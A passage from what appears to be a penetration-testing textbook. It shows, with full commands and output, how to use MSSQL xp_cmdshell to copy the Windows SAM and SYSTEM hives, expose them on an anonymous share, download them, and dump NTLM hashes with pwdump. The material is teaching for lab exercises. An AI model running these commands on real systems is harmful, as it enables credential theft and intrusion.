Hashing function
Username
Password
Login button
Username
Hashed password
User table
B. The username/password are
    passed to a function that
    produces a hashed equivalent
    of the password entered.
C. The username and hashed
    password are compared
    to the entries in the
    SAM’s user table.
D. If a match is found, the user
    is authenticated and permitted
    access to the Windows
    system.
A. User types their username
    and password and clicks the
    login button.
User0l
User02
User03
Password hash
Password hash
Password hash
Security accounts
manager (SAM)
registry hive
Access denied
(if hashes do
not match)
Access granted
(if hashes
match)
Figure 6.1
How Windows uses password hashes to authenticate users
112
CHAPTER 6
Attacking vulnerable database services
administrators. But Windows comes with a native binary executable called reg.exe,
which can be used to create a copy of these registry hives. These copies can be freely used
and manipulated without restriction. 
 Use your mssql-cli shell to make a copy of the SAM and SYSTEM registry hives, and
store them in the C:\windows\temp directory. The syntax for using the reg.exe com-
mand to copy registry hives is reg.exe save HKLM\SAM c:\windows\temp\sam and
reg.exe save HKLM\SYSTEM c:\windows\temp\sys.
master> exec master..xp_cmdshell 'reg.exe save HKLM\SAM c:\windows\temp\sam'    
+----------+
| output   |
|----------|
| The operation completed successfully.
           |
| NULL     |
+----------+
(2 rows affected)
Time: 0.457s
master> exec master..xp_cmdshell 'reg.exe save HKLM\SYSTEM
c:\windows\temp\sys'    
+----------+
| output   |
|----------|
| The operation completed successfully.
           |
| NULL     |
+----------+
(2 rows affected)
Time: 0.457s
master>
Listing 6.8
Using reg.exe to save registry hive copies
Saves a copy of the SAM registry
hive to c:\windows\temp\sam
Saves a copy of the SYS registry 
hive to c:\windows\temp\sys
Why copy the SYSTEM registry hive?
Up until now, I’ve only mentioned the SAM registry hive because that is the one that
stores the user’s password hashes. However, to obtain them from the SAM, you also
need to extract two secret keys—the syskey and the bootkey—from the SYSTEM reg-
istry hive.
The details of this process are documented in numerous blog posts and white
papers. It isn’t necessary for you to understand it completely, but if you are interested
and want to learn more, I recommend beginning with the source code to the cred-
dump Python framework located at https://github.com/moyix/creddump.
For obvious reasons, there is no official documentation from Microsoft called “how
to extract password hashes from the SAM.” But if you follow the source code from
the creddump project, you can see exactly how it’s done and why the bootkey and
syskey are required. From a practical viewpoint, all you have to know as a pentester
is that you need a valid copy of the SYSTEM and SAM registry hives. These are required
in order to dump hashes for local user accounts on a Windows machine.
113
Stealing Windows account password hashes
Now you can take a look at the contents of the temp directory by running dir
c:\windows\temp from your mssql-cli command prompt. There will be a file named
sam and a file named sys, which are the non-protected copies of the SAM and SYSTEM
registry hives you just created.
master> exec master..xp_cmdshell 'dir c:\windows\temp'
+-------------------------------------------------------------------+
| output                                                            |
|-------------------------------------------------------------------|
|  Volume in drive C has no label.                                  |
|  Volume Serial Number is 1CC3-8897                                |
| NULL                                                              |
|  Directory of c:\windows\temp                                     |
| NULL                                                              |
| 09/17/2019  12:31 PM              .                          |
| 09/17/2019  12:31 PM              ..                         |
| 05/08/2019  09:17 AM               957 ASPNETSetup_00000.log      |
| 05/08/2019  09:17 AM               959 ASPNETSetup_00001.log      |
| 01/31/2019  10:18 AM                 0 DMI4BD0.tmp                |
| 09/17/2019  12:28 PM           529,770 MpCmdRun.log               |
| 09/17/2019  12:18 PM           650,314 MpSigStub.log              |
| 09/17/2019  12:30 PM            57,344 sam                        |    
| 09/17/2019  12:09 PM               102 silconfig.log              |
| 09/17/2019  12:31 PM        14,413,824 sys                        |    
|                8 File(s)     15,653,270 bytes                     |
|                3 Dir(s)  11,515,486,208 bytes free                |
| NULL                                                              |
+-------------------------------------------------------------------+
(19 rows affected)
Time: 0.457s
master>
NOTE
Record the location of these files in your engagement notes. They are
miscellaneous files that will need to be removed during post-engagement
cleanup.
6.2.2
Downloading registry hive copies
You’ve created non-protected copies of the SYSTEM and SAM registry hives. Now what?
How do you extract the password hashes from them? It turns out there are at least a
dozen (probably more) tools you can use. Most of them, however, are likely to be
detected by the antivirus software that you should always assume your target Windows
system is running. 
 This is why I prefer to download the hive copies to my attacking machine, where
I’m free to use whatever tools I want to extract the hashes from them. Depending on
what is available to you from the machine you’ve compromised, there may be several
different methods to download files from a compromised target. In this example, I’m
Listing 6.9
Listing the contents of the c:\windows\temp directory
The SAM copy you just created
The SYSTEM 
copy you just 
created
114
CHAPTER 6
Attacking vulnerable database services
going to do what I find easiest in many cases: create a temporary network share using
the command-line access I have from the vulnerable MSSQL server.
 For this to work, you’ll run three separate commands using the mssql-cli shell.
The first two commands use the cacls command to modify the permissions of the
SAM and SYS registry hive copy files that you just created and allow full access to
the Everyone group. The third command creates a network file share pointing to the
c:\windows\temp directory, which is accessible anonymously by all users. Run the fol-
lowing commands one at a time using mssql-cli.
master> exec master..xp_cmdshell 'cacls c:\windows\temp\sam /E /G
"Everyone":F' 
master> exec master..xp_cmdshell 'cacls c:\windows\temp\sys /E /G
"Everyone":F' 
master> exec master..xp_cmdshell 'net share pentest=c:\windows\temp
/GRANT:"Anonymous Logon,FULL" /GRANT:"Everyone,FULL"' 
+----------------------------------+
| output                           |
|----------------------------------|
| pentest was shared successfully. |
| NULL                             |
| NULL                             |
+----------------------------------+
(3 rows affected)
Time: 1.019s (a second)
master>
Now you can exit the mssql-cli shell by typing exit. Connect to the network share
using the smbclient command from your terminal command prompt. The syntax of
the smbclient command is smbclient \\\\10.0.10.201\\pentest -U "" where the
two empty quotation marks specify an empty user account for anonymous logon.
When you are prompted to enter the password of the anonymous user, press the Enter
key to not enter a password. Once you are connected, you can download the SAM and
SYS registry hive copies using the get sam and get sys commands, as follows.
~$ smbclient \\\\10.0.10.201\\pentest -U ""   
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\'s password:    
Try "help" to get a list of possible commands.
smb: \> get sam     
getting file \sam of size 57344 as sam (2800.0 KiloBytes/sec) (average
2800.0 KiloBytes/sec)
smb: \> get sys     
getting file \sys of size 14413824 as sys (46000.0 KiloBytes/sec) (average
43349.7 KiloBytes/sec)
smb: \>
Listing 6.10
Preparing the network share using mssql-cli
Listing 6.11
Using smbclient to download SYS and SAM
Changes access controls on the sam hive copy
Changes access
controls on the
sys hive copy
Creates an
anonymously
accessible
network share
Connects to the network 
share anonymously
Press Enter without 
entering a password.
Downloads the SAM file
Downloads the SYS file
115
Extracting password hashes with creddump
TIP
Always be sure to clean up after yourself. As an attacker, you’ve just cre-
ated non-protected copies of the SYSTEM and SAM registry hives and also set up
an anonymous network share to download them. As a professional consul-
tant, you don’t want to leave your client unnecessarily exposed. Make sure
you go back into the system and delete the SYS and SAM copies from the
c:\windows\temp directory and also get rid of the network share you created
using the net share pentest /delete command.
6.3
Extracting password hashes with creddump
Many tools and frameworks exist that allow you to extract password hashes from cop-
ies of the SYSTEM and SAM registry hives. The first tool I ever used was a tool called
fgdump. Some of these tools are Windows executables that can be run directly from a
compromised host, but that convenience comes at a cost. As I mentioned, most will
flag antivirus engines. If any portion of your engagement scope mentions attempting
to remain stealthy and undetected, then uploading any foreign binary, let alone a
known hacker tool, is a risky move, which is precisely why we have chosen to perform
this operation off of the victim machine. 
 Because you’re using a Linux platform, and also because it’s one of my favorite
tools for this particular task, you’re going to use the creddump Python framework to
harvest the goodies you’re after from the SYSTEM and SAM registry hives. Install the
creddump framework by cloning the source code repository from your Ubuntu termi-
nal using git clone https://github.com/moyix/creddump.git.
~$ git clone https://github.com/moyix/creddump.git
Cloning into 'creddump'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Unpacking objects: 100% (27/27), done.
Now change into the creddump directory with the command cd creddump. Once in
this directory, you’ll see a couple of different Python scripts, which you don’t need to
look at right now. You’re interested in the pwdump.py script. This script handles all
the magic necessary to extract password hashes from the two registry hive copies. The
pwdump.py script is executable and can be run with ./pwdump /path/to/sys/hive
/path/to/sam/hive. In this example, three user accounts are extracted: the Adminis-
trator, Guest, and DefaultAccount accounts. 
~$ ./pwdump.py ../sys ../sam    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7
➥ e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d
➥ 7e0c089c0:::
Listing 6.12
Cloning the creddump source code repository
Listing 6.13
Using pwdump to extract local user account password hashes
Use git to pull down the 
latest version of the code.
Use pwdump to extract password hashes.
116
CHAPTER 6
Attacking vulnerable database services
6.3.1
Understanding pwdump’s output
If this is your first time looking at Windows account password hashes, they might be a
bit confusing. Once you understand the various pieces of information, though, they
will be clear. Each account displayed from the pwdump script appears on a new line,
and each line contains four pieces of information separated by colons:
 The username (Administrator)
 The user ID for that account (500)
 The LM hash, for legacy Windows systems (aad3b435b51404eeaad3b435b514-
04ee)
 The NTLM hash, which is the one you’re interested in as an attacker
(31d6cfe0d16ae931b73c59d7e0c089c0)
Store these hashes in your notes, and be sure to repeat this exercise for every level-one
host you compromise during the focused-penetration phase. When we move on to
privilege-escalation, you’re going to learn to use the Pass-the-Hash technique to
spread to level-two systems. These are hosts that don’t necessarily contain a direct
access vulnerability, but they share the local administrator account credentials with
one of the level-one hosts you’ve already compromised.
Exercise 6.1: Stealing the SYSTEM and SAM registry hives
Compromise the Gohan server by accessing the MSSQL console with the weak sa
account password, and activate xp_cmdshell. 
Use reg.exe to create copies of the SYSTEM and SAM registry hives. Place the copies
in the C:\windows\temp directory, and share the directory anonymously.
Download the registry hive copies to your attacking machine, and extract the local
user account password hashes using pwdump.py. How many local user accounts are
on this server?
The answer to this exercise can be found in appendix E.
What are LM Hashes?
Microsoft’s first attempt at hashes was called LAN Manager or LM hashes. These
hashes contained major security flaws that made it incredibly easy to crack them and
obtain the plain-text password. So, Microsoft created the New Technology LAN Man-
ager (NTLM) hash, which has been used since the days of Windows XP. All versions
of Windows since then have disabled the use of LM hashes by default. In fact, in our
example of dumped password hashes, you’ll notice that all three accounts have the
same value in the LM hash section: “aad3b435b51404eeaad3b435b51404ee.” 
If you Google this string, you will get many results, because this is the LM hash equiv-
alent of an empty string (“”). I don’t discuss or use LM hashes in this book, and you
probably will not uncover a modern enterprise network that still uses them.
117
Summary
Summary
 Database services can be a reliable means of compromising network hosts and
are often paired with a web service.
 Microsoft SQL Server services are particularly useful to an attacker because of
the xp_cmdshell system stored procedure.
 Windows systems store password hashes for local user accounts in the SAM reg-
istry hive.
 After compromising a level-one host (if it’s Windows-based), you should always
extract the local user account password hashes.
 Creating SYSTEM and SAM copies with reg.exe allow you to take the hash-
extraction process off the victim machine, reducing the likelihood of generat-
ing an antivirus alert on the victim machine.
118
Attacking
 unpatched services
Before moving on, let’s take a moment to revisit our friends, the Hollywood movie
heist crew, who are by now getting pretty deep into their target facility. The crew
has just reached a new floor in the complex, and they’re staring down a long hall-
way with doors on either side: red doors on the left (Linux and UNIX systems) and
blue doors on the right (Windows systems). As expected, all of the doors are locked
using sophisticated keycard access control panels. 
 The crew’s keycard door lock specialist (let’s pretend that’s a real thing) deter-
mines that the panels have an older model card reader—and this particular model
has a design flaw that can be used to bypass the locking mechanism. The details of
This chapter covers
 The exploit development life cycle
 MS17-010: Eternal Blue
 Using Metasploit to exploit an unpatched system
 Using the Meterpreter shell payload
 Generating custom shellcode for Exploit-DB 
exploits
119
Understanding software exploits
the bypass aren’t important; but if you need to visualize something to appreciate the